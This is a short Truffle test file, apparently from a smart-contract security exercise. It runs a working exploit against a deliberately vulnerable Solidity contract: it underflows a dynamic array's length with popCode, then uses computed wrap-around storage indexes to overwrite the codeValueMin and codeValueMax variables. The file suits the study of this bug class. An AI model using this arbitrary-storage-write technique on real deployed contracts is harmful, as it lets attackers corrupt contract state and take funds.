const Vulnerable = artifacts.require('Vulnerable');

contract('Vulnerable', async (accounts) => {
  it('success', async () => {
    let vulnerable = await Vulnerable.deployed();

    let codesStartIndex   = web3.utils.toBN(web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000004'));
    let codeValueMinIndex = web3.utils.toBN(1).shln(256).sub(codesStartIndex).add(web3.utils.toBN(2));
    let codeValueMaxIndex = web3.utils.toBN(1).shln(256).sub(codesStartIndex).add(web3.utils.toBN(3));

    let codeValueMin;
    let codeValueMax;

    codeValueMin = await vulnerable.codeValueMin();
    assert.equal(1000, codeValueMin);

    codeValueMax = await vulnerable.codeValueMax();
    assert.equal(9999, codeValueMax);

    // pop code (trigger the underflow of codes length)
    await vulnerable.popCode();

    // update code at codeValueMinIndex (manipulate codeValueMin)
    await vulnerable.updateCode(web3.utils.toHex(codeValueMinIndex), 5000);

    codeValueMin = await vulnerable.codeValueMin();
    assert.equal(5000, codeValueMin);

    // update code at codeValueMaxIndex (manipulate codeValueMax)
    await vulnerable.updateCode(web3.utils.toHex(codeValueMaxIndex), 5000);

    codeValueMax = await vulnerable.codeValueMax();
    assert.equal(5000, codeValueMax);
  });
});
